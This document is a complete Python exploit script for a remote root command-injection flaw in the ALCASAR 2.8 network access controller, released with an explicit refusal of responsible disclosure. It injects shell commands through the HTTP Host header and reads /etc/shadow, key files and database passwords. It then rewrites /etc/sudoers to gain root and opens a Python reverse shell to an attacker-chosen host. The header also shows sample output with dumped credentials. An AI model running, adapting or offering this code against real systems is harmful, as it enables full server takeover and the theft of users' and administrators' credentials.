# -*- coding: utf-8 -*-
#
####
#
#    ALCASAR <= 2.8 Remote Root Code Execution Vulnerability
#
#    Author: eF
#    Date  : 2014-02-10
#
#
#        db         88           ,ad8888ba,         db         ad88888ba         db         88888888ba
#       d88b        88          d8"&#039;    `"8b       d88b       d8"     "8b       d88b        88      "8b
#      d8&#039;`8b       88         d8&#039;                d8&#039;`8b      Y8,              d8&#039;`8b       88      ,8P
#     d8&#039;  `8b      88         88                d8&#039;  `8b     `Y8aaaaa,       d8&#039;  `8b      88aaaaaa8P&#039;
#    d8YaaaaY8b     88         88               d8YaaaaY8b      `"""""8b,    d8YaaaaY8b     88""""88&#039;
#   d8""""""""8b    88         Y8,             d8""""""""8b           `8b   d8""""""""8b    88    `8b
#  d8&#039;        `8b   88          Y8a.    .a8P  d8&#039;        `8b  Y8a     a8P  d8&#039;        `8b   88     `8b
# d8&#039;          `8b  88888888888  `"Y8888Y"&#039;  d8&#039;          `8b  "Y88888P"  d8&#039;          `8b  88      `8b
#
#
# ALCASAR is a free Network Access Controller which controls the Internet
# consultation networks. It authenticates, attributes and protects users&#039;
# access regardless their connected equipment (PC, PokÃ©dex, game console,
# etc.).
#
#
# ALCASAR Web UI, accessible by any unauthenticated user, suffers from a
# trivial vulnerability. In the "index.php" file:
#
#   exec("grep -Re ^$pattern$ /etc/dansguardian/lists/blacklists/*/domains|cut -d&#039;/&#039; -f6", $output);
#
# By sending a specially crafted value in the "host" HTTP header, it is possible
# to inject the exec() function in order to execute commands as Apache user.
#
# In addition, the Apache user is able to call sudo for these binaries:
#
# /sbin/ip,/sbin/arping,/sbin/arp,/usr/sbin/arpscan,/usr/sbin/tcpdump,/usr/local/bin/alcasar-watchdog.sh,/usr/local/sbin/alcasar-dhcp.sh
# /usr/local/bin/alcasar-conf.sh
# /usr/local/sbin/alcasar-mysql.sh
# /usr/local/sbin/alcasar-bl.sh,/usr/local/sbin/alcasar-havp.sh,/usr/local/bin/alcasar-file-clean.sh,/usr/local/sbin/alcasar-url_filter.sh
# /usr/local/sbin/alcasar-nf.sh,/usr/local/bin/alcasar-iptables.sh,/usr/sbin/ipset
# /usr/local/bin/alcasar-archive.sh
# /usr/bin/radwho,/usr/sbin/chilli_query
# /usr/local/sbin/alcasar-logout.sh
# /sbin/service,/usr/bin/killall,/sbin/chkconfig,/bin/systemctl
# /usr/bin/openssl
#
# As a result, we can use /usr/bin/openssl to read a file as root:
#
#   sudo /usr/bin/openssl base64 -in /etc/shadow -A | base64 -d
#
# Or to create or overwrite files as root (create a cron job, edit /etc/sudoers, etc.):
#
#   echo cHduZWQK | sudo /usr/bin/openssl base64 -d -out /etc/cron.d/pwned
#
# In this exploit, I choose to modify the "sudoers" file.
#
# Note: this vulnerability has been discovered in less than 30 seconds.
# The PHP code is dreadful and needs to be rewritten from scratch.
#
# Example (post-auth) in file acc/admin/activity.php:
#
#   if (isset($_POST[&#039;action&#039;])){
#       switch ($_POST[&#039;action&#039;]){
#            case &#039;user_disconnect&#039; :
#               exec ("sudo /usr/sbin/chilli_query logout $_POST[mac_addr]");
#
#
# This is not a responsible disclosure coz&#039; I have no sense of ethics and I couldn&#039;t care less.
#
#
# % python alcasar-2.8_rce.py alcasar.localdomain "alcasar-version.sh"
#
# [+] Hello, first here are some passwords for you:
# Password to protect the boot menu (GRUB) : cV9eEz1g
# Name and password of Mysql/mariadb administrator : root / FvYPr7b3
# Name and password of Mysql/mariadb user : radius / oRNln64j
# Shared secret between the script &#039;intercept.php&#039; and coova-chilli : b9Rj34jz
# Shared secret between coova-chilli and FreeRadius : 7tIrnkJu
#
# root:$2a$08$Aw4yIxQIUJ0taDjiXKSRYu6zZB5eUcbZ4445vo1157AdeGSfe1XuC:16319:0:99999:7:::
#
# [...]
#
# admin:alcasar.localdomain:49b8642b4646a4afa38cda065f76ce0e
#
# username        value
# user    $1$passwd$qr0Ajhr12fZ475a2qAZ.H.
#
# [-] whoami (should be apache):
# uid=495(apache) gid=492(apache) groups=492(apache)
#
# [+] On the way to the uid 0...
# [-] Got root?
# uid=0(root) gid=0(root) groups=0(root)
#
# [+] Your command Sir:
# The Running version (2.8) is up to date
#
#
####
 
import sys, os, re, httplib
 
class PWN_Alcasar:
 
    def __init__(self, host):
        self.host = host
        self.root = False
 
    def exec_cmd(self, cmd, output=False):
        tag = os.urandom(4).encode(&#039;hex&#039;)
 
        cmd = &#039;bash -c "%s" 2>&1&#039; % cmd.replace(&#039;"&#039;, &#039;\\"&#039;)
        if self.root:
            cmd = &#039;sudo %s&#039; % cmd
 
        headers = {
            &#039;host&#039; : &#039;aAaAa index.php;echo %s;echo %s|base64 -d -w0|sh|base64 -w0;#&#039; % (tag, cmd.encode(&#039;base64&#039;).replace(&#039;\n&#039;,&#039;&#039;))
        }
 
        c = httplib.HTTPConnection(self.host)
        c.request(&#039;GET&#039;, &#039;/index.php&#039;, &#039;&#039;, headers)
        r = c.getresponse()
        data = r.read()
        c.close()
 
        if data.find(tag) != -1:
            m = re.search(r&#039;%s, (.*)\s</div>&#039; % tag, data)
            if m:
                data = m.group(1).decode(&#039;base64&#039;)
                if output:
                    print data
                return data
        return None
 
    def read_file(self, filepath, output=True):
        return self.exec_cmd(&#039;sudo openssl base64 -in %s -A|base64 -d&#039; % filepath, output=output)
 
    def read_passwords(self):
        self.read_file(&#039;/root/ALCASAR-passwords.txt&#039;)
        self.read_file(&#039;/etc/shadow&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_all&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_admin&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_backup&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_manager&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_only_admin&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_only_backup&#039;)
        self.read_file(&#039;/usr/local/etc/digest/key_only_manager&#039;)
        alcasar_mysql = self.read_file(&#039;/usr/local/sbin/alcasar-mysql.sh&#039;, output=False)
        if alcasar_mysql:
            m = re.search(r&#039;radiuspwd="(.*)"&#039;, alcasar_mysql)
            if m:
                radiuspwd = m.group(1)
                sql = &#039;SELECT username,value FROM radcheck WHERE attribute like \&#039;%%password%%\&#039;&#039;
                self.exec_cmd(&#039;mysql -uradius -p\"%s\" radius -e "%s"&#039; % (radiuspwd, sql), output=True)
 
    def edit_sudoers(self):
        self.exec_cmd(&#039;sudo openssl base64 -in /etc/sudoers -out /tmp/sudoers.b64&#039;)
        self.exec_cmd(&#039;openssl base64 -d -in /tmp/sudoers.b64 -out /tmp/sudoers&#039;)
        self.exec_cmd(&#039;sed -i s/BL,NF/BL,ALL,NF/g /tmp/sudoers&#039;)
        self.exec_cmd(&#039;sudo openssl base64 -in /tmp/sudoers -out /tmp/sudoers.b64&#039;)
        self.exec_cmd(&#039;sudo openssl base64 -d -in /tmp/sudoers.b64 -out /etc/sudoers&#039;)
        self.exec_cmd(&#039;sudo rm -f /tmp/sudoers*&#039;)
        self.root = True
 
    def reverse_shell(self, rip, rport=&#039;80&#039;):
        payload = &#039;import socket,subprocess,os;&#039;
        payload += &#039;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&#039;
        payload += &#039;s.connect((\&#039;%s\&#039;,%s));&#039; % (rip, rport)
        payload += &#039;os.dup2(s.fileno(),0);&#039;
        payload += &#039;os.dup2(s.fileno(),1);&#039;
        payload += &#039;os.dup2(s.fileno(),2);&#039;
        payload += &#039;p=subprocess.call([\&#039;/bin/sh\&#039;,\&#039;-i\&#039;]);&#039;
        return self.exec_cmd(&#039;python -c "%s"&#039; % payload)
 
def usage():
    print &#039;Usage: %s host command (ip) (port)&#039; % sys.argv[0]
    print &#039;       "command" can be a shell command or "reverseshell"&#039;
    sys.exit(0)
  
if __name__ == &#039;__main__&#039;:
 
    if len(sys.argv) < 3:
        usage()
  
    cmd = sys.argv[2]
    if cmd == &#039;reverseshell&#039;:
        if len(sys.argv) < 5:
            print &#039;[!] Need IP and port for the reverse shell...&#039;
            sys.exit(0)
        rip = sys.argv[3]
        rport = sys.argv[4] # 80 is a good one...
 
    exploit = PWN_Alcasar(sys.argv[1])
    print &#039;[+] Hello, first here are some passwords for you:&#039;
    exploit.read_passwords()
    print &#039;[-] whoami (should be apache):&#039;
    exploit.exec_cmd(&#039;id&#039;, output=True)
    print &#039;[+] On the way to the uid 0...&#039;
    exploit.edit_sudoers()
    print &#039;[-] Got root?&#039;
    exploit.exec_cmd(&#039;id&#039;, output=True)
    if cmd == &#039;reverseshell&#039;:
        print &#039;[+] You should now have a shell on %s:%s&#039; % (rip, rport)
        exploit.reverse_shell(rip, rport)
    else:
        print &#039;[+] Your command Sir:&#039;
        exploit.exec_cmd(cmd, output=True)
    sys.exit(1)

